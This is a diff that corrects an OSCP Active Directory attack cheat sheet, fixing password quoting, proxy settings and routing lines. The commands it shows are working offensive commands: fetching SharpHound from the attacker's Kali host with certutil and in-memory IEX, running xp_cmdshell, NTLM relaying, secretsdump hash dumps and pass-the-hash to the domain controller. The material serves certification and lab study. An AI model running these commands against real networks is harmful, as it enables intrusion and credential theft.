@@ -6,20 +6,19 @@ draft: false
 summary: "A single linear attack flow for the OSCP AD set. Work through the phases in order and use only one method per task."
 ---
 
-A single linear attack flow for the OSCP AD set. Work through the PHASEs in order and use only one method per task.
+A single linear attack flow for the OSCP AD set. Work through the phases in order and use only one method per task.
 
 - Source: https://heretek.dev/oscp-cheatsheet/active-directory-playbook/ (Jean Romero) — Reconstructed
 - Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 - Replace `DC_IP`, `DOMAIN`, `USER`, `PASS`, `KALI_IP`, `FQDN`, etc. in the code with the values you found
 
-## Mentor advice — always escape ! in passwords
+## Mentor advice — quote passwords with `!`
 
 ```bash
-# If the password contains " ! ", always escape it as \!.
-# Even wrapping in ' ' causes problems at command execution and ! is not read correctly.
+# In bash, wrap the password in single quotes.
+# "Password1\!" passes a literal backslash to the command; in an interactive shell, history expansion can still bite.
 
-nxc smb 10.10.10.10 -u offsec -p "Password1\!"
-# nxc smb 10.10.10.10 -u offsec -p 'Password1!' does not work properly.
+nxc smb 10.10.10.10 -u offsec -p 'Password1!'
 ```
 
 ## Emergency response when stuck
@@ -112,7 +111,7 @@ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' | head -50
 ### 1b. After getting your first creds
 
 ```bash
-ldapdomaindump -u 'DOMAIN\\USER' -p 'PASS' DC_IP -o ldap-dump/
+ldapdomaindump -u 'DOMAIN\USER' -p 'PASS' DC_IP -o ldap-dump/
 nxc smb $ip -u '' -p '' --users
 # Save usernames to a file:
 nxc smb $ip -u '' -p '' --users | tee nxc_users_raw.txt | awk '$1=="SMB" && $5 !~ /^\[|\-Username\-/ {print $5}' | sort -u > users.txt      # check the description field for passwords
@@ -147,11 +146,11 @@ certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
 On Windows (SharpHound — when Kali cannot reach the DC):
 
 ```powershell
-certutil -urlcache -f http://KALI/SharpHound.exe C:\Windows\Temp\SharpHound.exe
+certutil -urlcache -f http://<KALI_IP>/SharpHound.exe C:\Windows\Temp\SharpHound.exe
 C:\Windows\Temp\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Windows\Temp\
 
 # Or in memory (no disk artifacts):
-IEX(New-Object Net.WebClient).DownloadString('http://KALI/SharpHound.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/SharpHound.ps1')
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
 
 # Bring the results back: evil-winrm download, or base64 encoding
@@ -330,7 +329,8 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 If sysadmin:
 
 ```text
-enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
+enable_xp_cmdshell
+EXEC xp_cmdshell 'whoami';
 EXEC xp_cmdshell 'hostname';
 ```
 
@@ -480,7 +480,7 @@ sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
 # Type 'socks' in the ntlmrelayx console to see active sessions
 
 # 6. Use the relay session with proxychains
-# Last line of /etc/proxychains.conf: socks4 127.0.0.1 1080
+# Last line of /etc/proxychains.conf: socks5 127.0.0.1 1080
 proxychains -q impacket-secretsdump DOMAIN/USER@TARGET -no-pass
 proxychains -q nxc smb TARGET -u USER -p '' --sam
 ```
@@ -856,7 +856,7 @@ ifconfig
 start
 
 # Kali routing:
-sudo ip route add $TARGET/24 dev ligolo
+sudo ip route add 172.16.1.0/24 dev ligolo
 
 # Callbacks through the tunnel:
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
@@ -873,8 +873,8 @@ impacket-secretsdump 'DOMAIN/USER'@DC_IP -hashes :NTHASH -just-dc
 evil-winrm -i DC_IP -u Administrator -H NTHASH
 impacket-psexec 'DOMAIN/Administrator'@DC_IP -hashes :NTHASH
 
-# Proof
-type C:\Users\Administrator\Desktop\proof.txt
+# Proof — run on the Windows target in cmd.exe:
+# type C:\Users\Administrator\Desktop\proof.txt
 ```
 
 ### Constrained Delegation
